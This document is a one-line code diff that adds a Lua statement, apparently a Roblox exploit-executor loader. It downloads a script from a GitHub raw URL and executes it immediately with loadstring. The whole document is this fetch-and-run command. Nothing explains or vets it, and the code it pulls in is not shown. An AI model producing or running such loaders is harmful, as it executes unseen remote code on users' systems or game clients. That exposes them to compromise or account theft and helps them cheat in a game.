@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://github.com/h8h88/soulsthingy/raw/refs/heads/main/souls1"))()
